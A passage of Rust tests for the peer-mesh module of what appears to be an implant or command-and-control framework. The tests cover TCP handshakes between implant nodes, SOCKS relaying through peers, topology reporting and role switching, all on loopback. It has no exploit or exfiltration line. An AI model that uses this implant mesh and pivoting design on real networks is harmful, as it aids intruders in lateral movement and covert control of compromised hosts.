            let hash = crypto::sha256(pubkey.as_bytes());
            let peer_id = common::ImplantId::from_bytes(&hash[..16]).unwrap();
            peer_ids.push(peer_id);
        }

        let accepted = accept_handle.join().unwrap();
        assert_eq!(accepted, num_clients, "should accept all clients");

        // Give registration time to complete
        thread::sleep(Duration::from_millis(100));

        // Verify all peers registered
        for peer_id in &peer_ids {
            assert!(mod_mesh::tcp::is_connected(peer_id), "peer {:?} should be registered", peer_id);
        }

        // Cleanup
        for peer_id in peer_ids {
            mod_mesh::tcp::disconnect(peer_id);
        }
    }

    /// Stress test: 5 clients connect simultaneously to a single listener using a Barrier,
    /// server accepts all handshakes, all peers are registered in tcp::list_peers().
    #[test]
    fn test_mesh_connect_concurrent_to_listener() {
        use std::sync::{Arc, Barrier};

        let _guard = REGISTRY_LOCK.lock().unwrap();

        // Drain any peers left over from previous tests.
        for id in mod_mesh::tcp::list_peers() {
            mod_mesh::tcp::disconnect(id);
        }

        let num_clients = 5usize;
        let server = mod_mesh::tcp::TcpServer::bind("127.0.0.1", 0).unwrap();
        let port = server.local_addr().unwrap().port();

        // Server thread: accept exactly num_clients connections and run handshake on each.
        let accept_handle = thread::spawn(move || {
            let mut accepted = 0usize;
            for _ in 0..500 {
                if let Ok(Some(stream)) = server.accept() {
                    let _ = thread::spawn(move || {
                        handle_incoming_tcp_connection(stream)
                    });
                    accepted += 1;
                    if accepted >= num_clients {
                        break;
                    }
                }
                thread::sleep(Duration::from_millis(10));
            }
            accepted
        });

        // Give the listener a moment to reach accept().
        thread::sleep(Duration::from_millis(50));

        // Barrier ensures all 5 client threads attempt to connect at the same instant.
        let barrier = Arc::new(Barrier::new(num_clients));
        let mut client_handles = Vec::with_capacity(num_clients);

        for _ in 0..num_clients {
            let barrier = Arc::clone(&barrier);
            let handle = thread::spawn(move || {
                // All clients wait here until every thread is ready.
                barrier.wait();

                let mut conn = mod_mesh::tcp::connect("127.0.0.1", port).unwrap();
                let keypair = crypto::generate_keypair().unwrap();
                let pubkey = keypair.0.clone();
                let _ = mod_mesh::initiate_handshake(&mut conn, &keypair, None).unwrap();

                // Derive the peer ID this client will be known as on the server side.
                let hash = crypto::sha256(pubkey.as_bytes());
                common::ImplantId::from_bytes(&hash[..16]).unwrap()
            });
            client_handles.push(handle);
        }

        // Collect all 5 client-side peer IDs.
        let mut peer_ids = Vec::with_capacity(num_clients);
        for handle in client_handles {
            let peer_id = handle.join().expect("client thread panicked");
            peer_ids.push(peer_id);
        }

        let accepted = accept_handle.join().expect("accept thread panicked");
        assert_eq!(accepted, num_clients, "server should have accepted all {} clients", num_clients);

        // Give server-side handshake threads time to register their peers.
        thread::sleep(Duration::from_millis(100));

        // All 5 peers must appear in the registry.
        let all_peers = mod_mesh::tcp::list_peers();
        for peer_id in &peer_ids {
            assert!(
                all_peers.contains(peer_id),
                "peer {:?} should be registered in tcp::list_peers()",
                peer_id
            );
        }
        assert!(
            all_peers.len() >= num_clients,
            "expected at least {} registered peers, got {}",
            num_clients,
            all_peers.len()
        );

        // Cleanup: disconnect all peers added by this test.
        for peer_id in peer_ids {
            mod_mesh::tcp::disconnect(peer_id);
        }
    }

    /// Test that execute_socks_connect processes a connect request and returns encoded bytes
    #[test]
    fn test_socks_connect_creates_channel() {
        let req = protocol::MeshSocksConnect {
            channel_id: 42,
            target_host: "192.0.2.1".to_string(),
            target_port: 8080,
        };

        let result = execute_socks_connect(req);

        // The handler returns Ok in both success and failure cases —
        // it encodes a MeshSocksResponse either way.
        assert!(result.is_ok(), "execute_socks_connect should return Ok: {:?}", result);

        let bytes = result.unwrap();
        assert!(!bytes.is_empty(), "response bytes should not be empty");
    }

    /// Test that execute_socks_data processes a data payload without error
    #[test]
    fn test_socks_data_processes_payload() {
        let req = protocol::MeshSocksData {
            channel_id: 7,
            data: vec![0xDE, 0xAD, 0xBE, 0xEF],
            eof: false,
        };

        let result = execute_socks_data(req);

        assert!(result.is_ok(), "execute_socks_data should return Ok: {:?}", result);
        // Current implementation acknowledges receipt with an empty payload
        assert_eq!(result.unwrap(), Vec::<u8>::new(), "non-eof data response should be empty");
    }

    /// Test that execute_socks_data handles eof=true without error
    #[test]
    fn test_socks_data_handles_eof() {
        let req = protocol::MeshSocksData {
            channel_id: 99,
            data: vec![],
            eof: true,
        };

        let result = execute_socks_data(req);

        assert!(result.is_ok(), "execute_socks_data with eof should return Ok: {:?}", result);
        assert_eq!(result.unwrap(), Vec::<u8>::new(), "eof response should be empty");
    }

    /// Test that SOCKS connect request dispatched through execute_mesh_module is
    /// relayed to the handler and the channel_id is preserved in the response.
    ///
    /// This simulates what happens when a MeshSocksConnect arrives over a mesh
    /// peer link: execute_mesh_module decodes the MeshTask, routes it to
    /// execute_socks_connect, and returns an encoded MeshSocksResponse.  The
    /// target address used here (192.0.2.1 — TEST-NET-1, RFC 5737) will not be
    /// reachable in CI, so the handler is expected to return a failure response
    /// rather than a hard error, exercising the relay-response path.
    #[test]
    fn test_socks_via_peer_connect_relay() {
        use prost::Message;

        let channel_id: u32 = 1234;

        // Build the MeshTask that would arrive from a peer asking us to open a
        // SOCKS channel on its behalf.
        let socks_connect = protocol::MeshSocksConnect {
            channel_id,
            target_host: "192.0.2.1".to_string(), // TEST-NET-1, RFC 5737 — never routable
            target_port: 9999,
        };
        let mesh_task = protocol::MeshTask {
            operation: Some(protocol::mesh_task::Operation::SocksConnect(socks_connect)),
        };

        let task_bytes = {
            let mut buf = Vec::new();
            mesh_task.encode(&mut buf).expect("MeshTask encode failed");
            buf
        };

        // Dispatch through the top-level handler exactly as the mesh receive
        // loop would.
        let result = execute_mesh_module(&task_bytes);

        // The handler must not return an Err — it must relay a MeshSocksResponse
        // back regardless of whether the underlying TCP connect succeeded.
        assert!(
            result.is_ok(),
            "execute_mesh_module (SocksConnect) should return Ok: {:?}",
            result
        );

        let response_bytes = result.unwrap();
        assert!(
            !response_bytes.is_empty(),
            "SocksConnect relay response must not be empty"
        );

        // Decode and verify the channel_id round-trips correctly so the peer
        // can match the response to its original request.
        let response = protocol::MeshSocksResponse::decode(response_bytes.as_slice())
            .expect("response should decode as MeshSocksResponse");

        assert_eq!(
            response.channel_id, channel_id,
            "channel_id must be preserved in relay response"
        );
    }

    /// Test that SOCKS data dispatched through execute_mesh_module is handled
    /// for each channel independently, and that EOF terminates the channel
    /// without returning an error to the relay caller.
    #[test]
    fn test_socks_via_peer_data_relay() {
        use prost::Message;

        // Helper: encode a MeshTask carrying SocksData and dispatch it.
        let dispatch_data = |channel_id: u32, data: Vec<u8>, eof: bool| -> ImplantResult<Vec<u8>> {
            let socks_data = protocol::MeshSocksData { channel_id, data, eof };
            let mesh_task = protocol::MeshTask {
                operation: Some(protocol::mesh_task::Operation::SocksData(socks_data)),
            };
            let mut buf = Vec::new();
            mesh_task.encode(&mut buf).expect("MeshTask encode failed");
            execute_mesh_module(&buf)
        };

        // --- channel A: two data frames then EOF ---
        let chan_a: u32 = 10;

        let r1 = dispatch_data(chan_a, vec![0x01, 0x02, 0x03], false);
        assert!(r1.is_ok(), "channel A first data frame should succeed: {:?}", r1);
        assert_eq!(r1.unwrap(), Vec::<u8>::new(), "data-frame ack should be empty");

        let r2 = dispatch_data(chan_a, vec![0x04, 0x05], false);
        assert!(r2.is_ok(), "channel A second data frame should succeed: {:?}", r2);

        let r_eof_a = dispatch_data(chan_a, vec![], true);
        assert!(
            r_eof_a.is_ok(),
            "channel A EOF should be accepted without error: {:?}",
            r_eof_a
        );
        assert_eq!(
            r_eof_a.unwrap(),
            Vec::<u8>::new(),
            "EOF ack should be empty"
        );

        // --- channel B: independent channel unaffected by channel A's EOF ---
        let chan_b: u32 = 20;

        let r_b = dispatch_data(chan_b, vec![0xAA, 0xBB], false);
        assert!(
            r_b.is_ok(),
            "channel B data should succeed after channel A EOF: {:?}",
            r_b
        );

        let r_eof_b = dispatch_data(chan_b, vec![], true);
        assert!(
            r_eof_b.is_ok(),
            "channel B EOF should succeed: {:?}",
            r_eof_b
        );

        // --- zero-length non-EOF frame is valid (keep-alive / flush) ---
        let chan_c: u32 = 30;
        let r_empty = dispatch_data(chan_c, vec![], false);
        assert!(
            r_empty.is_ok(),
            "zero-length non-EOF data frame should be accepted: {:?}",
            r_empty
        );
    }


    // -----------------------------------------------------------------------
    // Helpers shared by the topology tests
    // -----------------------------------------------------------------------

    /// Serialise tests that mutate the global TCP peer registry so they do not
    /// race when `cargo test` runs them in parallel threads.
    static REGISTRY_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

    /// Create a live loopback `TcpConnection` without performing a mesh
    /// handshake — sufficient for populating the peer registry in unit tests.
    fn make_loopback_connection() -> mod_mesh::tcp::TcpConnection {
        use std::net::{TcpListener, TcpStream};
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = listener.local_addr().unwrap();
        let connect_handle = thread::spawn(move || TcpStream::connect(addr).unwrap());
        let (server_stream, _) = listener.accept().unwrap();
        let _client = connect_handle.join().unwrap(); // keep client end alive so server stays open
        mod_mesh::tcp::TcpConnection::new(server_stream).unwrap()
    }

    // -----------------------------------------------------------------------
    // execute_mesh_get_topology tests
    // -----------------------------------------------------------------------

    /// With no peers registered the topology report should return an empty
    /// peer list and the current role (Leaf = 0).
    #[test]
    fn test_mesh_get_topology_empty() {
        let _guard = REGISTRY_LOCK.lock().unwrap();

        // Drain any peers that may have leaked from concurrent tests.
        for id in mod_mesh::tcp::list_peers() {
            mod_mesh::tcp::disconnect(id);
        }
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);

        let result = execute_mesh_get_topology();
        assert!(result.is_ok(), "execute_mesh_get_topology should succeed: {:?}", result);

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");

        assert!(
            report.peers.is_empty(),
            "expected empty peer list, got {} peers",
            report.peers.len()
        );
        assert_eq!(
            report.role,
            MeshRoleType::MeshRoleLeaf as i32,
            "role should be Leaf (0)"
        );
    }

    /// Registering mock TCP peers directly into the global registry should
    /// cause them to appear in the topology report with correct transport and
    /// link-state fields.
    #[test]
    fn test_mesh_get_topology_with_peers() {
        let _guard = REGISTRY_LOCK.lock().unwrap();

        // Drain any pre-existing peers.
        for id in mod_mesh::tcp::list_peers() {
            mod_mesh::tcp::disconnect(id);
        }
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);

        let peer_id_a = common::ImplantId::from_bytes(&[0xAAu8; 16]).unwrap();
        let peer_id_b = common::ImplantId::from_bytes(&[0xBBu8; 16]).unwrap();

        mod_mesh::tcp::register(peer_id_a, make_loopback_connection());
        mod_mesh::tcp::register(peer_id_b, make_loopback_connection());

        let result = execute_mesh_get_topology();
        assert!(result.is_ok(), "execute_mesh_get_topology should succeed: {:?}", result);

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");

        assert_eq!(
            report.peers.len(),
            2,
            "expected 2 peers in topology, got {}",
            report.peers.len()
        );

        let mut found_a = false;
        let mut found_b = false;
        for peer in &report.peers {
            if peer.peer_id.as_slice() == peer_id_a.as_bytes() {
                found_a = true;
            }
            if peer.peer_id.as_slice() == peer_id_b.as_bytes() {
                found_b = true;
            }
            assert_eq!(
                peer.transport,
                MeshTransportType::MeshTransportTcp as i32,
                "transport should be TCP"
            );
            assert_eq!(
                peer.link_state,
                protocol::MeshLinkState::MeshLinkActive as i32,
                "link state should be Active"
            );
        }
        assert!(found_a, "peer_id_a should appear in topology report");
        assert!(found_b, "peer_id_b should appear in topology report");

        // Cleanup.
        mod_mesh::tcp::disconnect(peer_id_a);
        mod_mesh::tcp::disconnect(peer_id_b);
    }

    /// Setting the role to Hub before calling get_topology should be reflected
    /// in the `role` field of the returned `MeshTopologyReport`.
    #[test]
    fn test_mesh_get_topology_reflects_role() {
        let _guard = REGISTRY_LOCK.lock().unwrap();

        // Drain any pre-existing peers so the peer list is predictably empty.
        for id in mod_mesh::tcp::list_peers() {
            mod_mesh::tcp::disconnect(id);
        }

        MESH_ROLE.store(2, std::sync::atomic::Ordering::SeqCst); // Hub
        assert_eq!(get_mesh_role(), MeshRoleType::MeshRoleHub);

        let result = execute_mesh_get_topology();
        assert!(result.is_ok(), "execute_mesh_get_topology should succeed: {:?}", result);

        let bytes = result.unwrap();
        let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
            .expect("response should decode as MeshTopologyReport");

        assert_eq!(
            report.role,
            MeshRoleType::MeshRoleHub as i32,
            "topology report role should be Hub when MESH_ROLE is 2"
        );

        // Restore to Leaf so we do not pollute other tests.
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);
    }

    /// Stress test: 50 threads concurrently calling execute_mesh_get_topology().
    ///
    /// All threads are held at a barrier so they fire simultaneously, maximising
    /// contention on the shared MESH_ROLE atomic and the TCP peer registry.
    /// Each call must return a valid, decodable MeshTopologyReport without
    /// panicking, demonstrating handler thread-safety.
    #[test]
    fn test_mesh_handlers_concurrent_topology_requests() {
        use std::sync::{Arc, Barrier};

        const THREAD_COUNT: usize = 50;

        // Pre-set a known role so readers have a consistent baseline.
        MESH_ROLE.store(1, std::sync::atomic::Ordering::SeqCst); // Relay

        let barrier = Arc::new(Barrier::new(THREAD_COUNT));
        let mut handles = Vec::with_capacity(THREAD_COUNT);

        for _ in 0..THREAD_COUNT {
            let barrier = Arc::clone(&barrier);
            handles.push(thread::spawn(move || {
                // Hold all threads at the gate for maximum simultaneous contention.
                barrier.wait();

                let result = execute_mesh_get_topology();

                assert!(
                    result.is_ok(),
                    "execute_mesh_get_topology should return Ok: {:?}",
                    result
                );

                // Response must decode as a valid MeshTopologyReport.
                let bytes = result.unwrap();
                let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
                    .expect("response must decode as MeshTopologyReport");

                // role field must be a recognised MeshRoleType variant.
                assert!(
                    MeshRoleType::try_from(report.role).is_ok(),
                    "report.role must be a valid MeshRoleType, got {}",
                    report.role
                );
            }));
        }

        for handle in handles {
            handle.join().expect("topology stress thread panicked");
        }

        // Restore to Leaf so we do not pollute other tests.
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);
    }

    /// Stress test: multiple threads concurrently calling execute_mesh_set_role(),
    /// cycling through all three valid roles.
    ///
    /// Verifies that MESH_ROLE's atomic store/load handles concurrent writers
    /// without data races and that the final value is always one of the three
    /// valid role bytes (0, 1, or 2).
    #[test]
    fn test_mesh_handlers_concurrent_role_changes() {
        use std::sync::{Arc, Barrier};

        const THREAD_COUNT: usize = 30;
        const ITERS_PER_THREAD: usize = 10;

        let roles = [
            MeshRoleType::MeshRoleLeaf as i32,
            MeshRoleType::MeshRoleRelay as i32,
            MeshRoleType::MeshRoleHub as i32,
        ];

        let barrier = Arc::new(Barrier::new(THREAD_COUNT));
        let mut handles = Vec::with_capacity(THREAD_COUNT);

        for t in 0..THREAD_COUNT {
            let barrier = Arc::clone(&barrier);
            handles.push(thread::spawn(move || {
                barrier.wait();

                for i in 0..ITERS_PER_THREAD {
                    let role_val = roles[(t + i) % roles.len()];
                    let set_role = protocol::MeshSetRole { role: role_val };

                    let result = execute_mesh_set_role(set_role);
                    assert!(
                        result.is_ok(),
                        "execute_mesh_set_role should return Ok: {:?}",
                        result
                    );

                    // Response must decode and echo back the role we requested.
                    let bytes = result.unwrap();
                    let report = protocol::MeshTopologyReport::decode(bytes.as_slice())
                        .expect("response must decode as MeshTopologyReport");
                    assert_eq!(
                        report.role, role_val,
                        "response role must match the role passed to execute_mesh_set_role"
                    );
                }
            }));
        }

        for handle in handles {
            handle.join().expect("role-change stress thread panicked");
        }

        // After all concurrent writes MESH_ROLE must hold one of the three valid values.
        let final_val = MESH_ROLE.load(std::sync::atomic::Ordering::SeqCst);
        assert!(
            final_val <= 2,
            "MESH_ROLE must be 0, 1, or 2 after concurrent writes, got {}",
            final_val
        );

        // get_mesh_role() must be consistent with the raw atomic value.
        let expected_role = match final_val {
            0 => MeshRoleType::MeshRoleLeaf,
            1 => MeshRoleType::MeshRoleRelay,
            2 => MeshRoleType::MeshRoleHub,
            _ => unreachable!(),
        };
        assert_eq!(
            get_mesh_role(),
            expected_role,
            "get_mesh_role() must be consistent with MESH_ROLE atomic after concurrent writes"
        );

        // Restore to Leaf so we do not pollute other tests.
        MESH_ROLE.store(0, std::sync::atomic::Ordering::SeqCst);
    }

    /// Integration test: 3-node TCP mesh topology (A ← B ← C chain).
    ///
    /// Layout:
    ///   - Node A: listener only (accepts B's inbound connection)
    ///   - Node B: connects to A as client; also acts as listener (accepts C)
    ///   - Node C: connects to B as client
    ///
    /// After both handshakes complete the test verifies:
    ///   1. Node A has B registered as a peer.
    ///   2. Node B has both A and C registered as peers.
    ///   3. Node C has B registered as a peer.
    ///   4. `tcp::list_peers()` on each logical node reflects the expected set.
    ///
    /// Because all three nodes share the same process-global TCP peer registry
    /// the test acquires REGISTRY_LOCK for its full duration and drains the
    /// registry before and after.
    #[test]
    fn test_mesh_three_node_topology() {
        let _guard = REGISTRY_LOCK.lock().unwrap();

        // Drain any peers that may have leaked from a previous test.
        for id in mod_mesh::tcp::list_peers() {
            mod_mesh::tcp::disconnect(id);
        }

        // ------------------------------------------------------------------
        // Phase 1 – start listeners for node A and node B
        // ------------------------------------------------------------------
        let server_a = mod_mesh::tcp::TcpServer::bind("127.0.0.1", 0).unwrap();
        let port_a = server_a.local_addr().unwrap().port();

        let server_b = mod_mesh::tcp::TcpServer::bind("127.0.0.1", 0).unwrap();
        let port_b = server_b.local_addr().unwrap().port();

        // ------------------------------------------------------------------
        // Phase 2 – accept threads (one per listener)
        // ------------------------------------------------------------------

        // Node A's accept loop: waits for exactly one connection from B.
        let accept_a = thread::spawn(move || {
            for _ in 0..100 {
                if let Ok(Some(stream)) = server_a.accept() {
                    return handle_incoming_tcp_connection(stream);
                }
                thread::sleep(Duration::from_millis(10));
            }
            Err(ImplantError::Transport("node A accept timeout".into()))
        });

        // Node B's accept loop: waits for exactly one connection from C.
        let accept_b = thread::spawn(move || {
            for _ in 0..100 {
                if let Ok(Some(stream)) = server_b.accept() {
                    return handle_incoming_tcp_connection(stream);
                }
                thread::sleep(Duration::from_millis(10));
            }
            Err(ImplantError::Transport("node B accept timeout".into()))
        });

        // Give both listeners a moment to reach their accept() call.
        thread::sleep(Duration::from_millis(50));

        // ------------------------------------------------------------------
        // Phase 3 – B connects to A (B is the initiator for the A→B link)
        // ------------------------------------------------------------------
        let keypair_b = crypto::generate_keypair().unwrap();
        let pubkey_b = keypair_b.0.clone();

        let connect_b_to_a = thread::spawn(move || {
            let mut conn = mod_mesh::tcp::connect("127.0.0.1", port_a).unwrap();
            mod_mesh::initiate_handshake(&mut conn, &keypair_b, None).unwrap();
            // Derive the ImplantId B will be known as on node A's side.
            let hash = crypto::sha256(pubkey_b.as_bytes());
            common::ImplantId::from_bytes(&hash[..16]).unwrap()
        });

        // ------------------------------------------------------------------
        // Phase 4 – C connects to B (C is the initiator for the B→C link)
        // ------------------------------------------------------------------
        let keypair_c = crypto::generate_keypair().unwrap();
        let pubkey_c = keypair_c.0.clone();

        let connect_c_to_b = thread::spawn(move || {
            let mut conn = mod_mesh::tcp::connect("127.0.0.1", port_b).unwrap();
            mod_mesh::initiate_handshake(&mut conn, &keypair_c, None).unwrap();
            // Derive the ImplantId C will be known as on node B's side.
            let hash = crypto::sha256(pubkey_c.as_bytes());
            common::ImplantId::from_bytes(&hash[..16]).unwrap()
        });

        // ------------------------------------------------------------------
        // Phase 5 – collect results
        // ------------------------------------------------------------------

        // Server-side handshake completions register the new peer internally.
        let accept_a_result = accept_a.join().unwrap();
        let accept_b_result = accept_b.join().unwrap();

        assert!(
            accept_a_result.is_ok(),
            "node A accept/handshake should succeed: {:?}",
            accept_a_result
        );
        assert!(
            accept_b_result.is_ok(),
            "node B accept/handshake should succeed: {:?}",
            accept_b_result
        );

        // Client-side connect/handshake also registers the peer.
        let peer_b_id_on_a = connect_b_to_a.join().unwrap();
        let peer_c_id_on_b = connect_c_to_b.join().unwrap();

        // Give both sides a moment to finish registering.
        thread::sleep(Duration::from_millis(100));

        // ------------------------------------------------------------------
        // Phase 6 – verify the peer registry
        // ------------------------------------------------------------------

        // B should be registered (visible from A's perspective via the global registry).
        assert!(
            mod_mesh::tcp::is_connected(&peer_b_id_on_a),
            "node B should be registered as a peer (seen from A)"
        );

        // C should be registered (visible from B's perspective).
        assert!(
            mod_mesh::tcp::is_connected(&peer_c_id_on_b),
            "node C should be registered as a peer (seen from B)"
        );

        // list_peers() must contain at least both B and C.
        let all_peers = mod_mesh::tcp::list_peers();
        assert!(
            all_peers.contains(&peer_b_id_on_a),
            "list_peers() should include node B's peer ID"
        );
        assert!(
            all_peers.contains(&peer_c_id_on_b),
            "list_peers() should include node C's peer ID"
        );

        // The registry must have at least 2 entries (B registered by A's server
        // thread and by B's own client thread share the same ID, so exactly 2
        // distinct peer IDs are expected: peer_b_id_on_a and peer_c_id_on_b).
        assert!(
            all_peers.len() >= 2,
            "expected at least 2 registered peers, got {}",
            all_peers.len()
        );

        // ------------------------------------------------------------------
        // Cleanup
        // ------------------------------------------------------------------
        mod_mesh::tcp::disconnect(peer_b_id_on_a);
        mod_mesh::tcp::disconnect(peer_c_id_on_b);
    }

    // =========================================================================
    // MeshDisconnect Tests
    // =========================================================================

    /// Test that disconnect with invalid peer_id bytes returns an error
    #[test]
    fn test_mesh_disconnect_invalid_peer_id() {
        // Too short - should fail to parse
        let disconnect = protocol::MeshDisconnect {
            peer_id: vec![0x01, 0x02, 0x03], // Only 3 bytes, need 16
        };

        let result = execute_mesh_disconnect(disconnect);
        assert!(result.is_err(), "disconnect with invalid peer_id should fail");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("invalid peer_id"),
            "error should mention invalid peer_id: {}",
            err
        );
    }

    /// Test that disconnect removes peer from keepalive monitoring
    #[test]
    fn test_mesh_disconnect_unregisters_keepalive() {
        let peer_id = common::ImplantId::from_bytes(&[0xDDu8; 16]).unwrap();

        // Register the peer with keepalive
        mod_mesh::keepalive::register_peer(peer_id);

        // Verify it's registered
        let health_before = mod_mesh::keepalive::get_peer_health();
        assert!(
            health_before.iter().any(|h| h.peer_id == peer_id),
            "peer should be registered in keepalive before disconnect"
        );

        // Execute disconnect
        let disconnect = protocol::MeshDisconnect {
            peer_id: peer_id.as_bytes().to_vec(),
        };
        let result = execute_mesh_disconnect(disconnect);
        assert!(result.is_ok(), "disconnect should succeed: {:?}", result);

        // Verify it's unregistered from keepalive
        let health_after = mod_mesh::keepalive::get_peer_health();
        assert!(
            !health_after.iter().any(|h| h.peer_id == peer_id),
            "peer should be unregistered from keepalive after disconnect"
        );
    }

    /// Test that disconnect removes a registered TCP peer
    #[test]
    fn test_mesh_disconnect_tcp_peer() {
        let _guard = REGISTRY_LOCK.lock().unwrap();

        let peer_id = common::ImplantId::from_bytes(&[0xEEu8; 16]).unwrap();

        // Register a TCP connection for this peer
        mod_mesh::tcp::register(peer_id, make_loopback_connection());

        // Verify it's connected
        assert!(
            mod_mesh::tcp::is_connected(&peer_id),
            "peer should be connected before disconnect"
        );

        // Execute disconnect
        let disconnect = protocol::MeshDisconnect {
            peer_id: peer_id.as_bytes().to_vec(),
        };
        let result = execute_mesh_disconnect(disconnect);
        assert!(result.is_ok(), "disconnect should succeed: {:?}", result);

        // Verify it's disconnected
        assert!(
            !mod_mesh::tcp::is_connected(&peer_id),
            "peer should not be connected after disconnect"
        );
    }
}
